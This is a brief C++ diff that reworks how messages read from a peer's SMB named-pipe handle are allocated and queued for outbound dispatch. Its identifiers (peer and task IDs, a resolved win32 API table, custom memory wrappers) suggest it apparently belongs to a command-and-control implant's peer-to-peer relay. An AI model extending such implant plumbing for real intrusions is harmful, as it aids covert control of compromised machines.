@@ -428,28 +428,28 @@ namespace Smb {
                     }
                 }
 
-                _stream *stream = R_CAST(_stream*, x_malloc(sizeof(_stream)));
-                _stream search  = { };
-                int32_t offset  = 0;
+                _stream search = { };
+                int32_t offset = 0;
 
                 while (PeekClientMessage(peer->ingress_handle, search, offset)) {
+                    auto queue = R_CAST(_stream*, x_malloc(sizeof(_stream)));
 
-                    x_memcpy(&stream->peer_id     , &search.peer_id, sizeof(uint32_t));
-                    x_memcpy(&stream->task_id     , &search.task_id, sizeof(uint32_t));
-                    x_memcpy(&stream->msg_type    , &search.msg_type, sizeof(uint32_t));
-                    x_memcpy(&stream->length      , &search.length, sizeof(uint32_t));
-                    x_memset(&search              , 0, sizeof(_stream));
+                    x_memcpy(&queue->peer_id     , &search.peer_id, sizeof(uint32_t));
+                    x_memcpy(&queue->task_id     , &search.task_id, sizeof(uint32_t));
+                    x_memcpy(&queue->msg_type    , &search.msg_type, sizeof(uint32_t));
+                    x_memcpy(&queue->length      , &search.length, sizeof(uint32_t));
+                    x_memset(&search             , 0, sizeof(_stream));
 
                     SetFilePointer(peer->ingress_handle, offset, nullptr, FILE_BEGIN);
-                    stream->buffer = B_PTR(x_malloc(stream->length));
+                    queue->buffer = B_PTR(x_malloc(queue->length));
 
-                    if (!PipeRead(peer->ingress_handle, stream)) {
-                        x_free(stream->buffer);
-                        x_free(stream);
+                    if (!PipeRead(peer->ingress_handle, queue)) {
+                        x_free(queue->buffer);
+                        x_free(queue);
                         return_defer(ntstatus);
                     }
 
-                    Dispatcher::OutboundQueue(stream);
+                    Dispatcher::OutboundQueue(queue);
                 }
 
                 Ctx->win32.SleepEx(500, FALSE); // wait a moment...
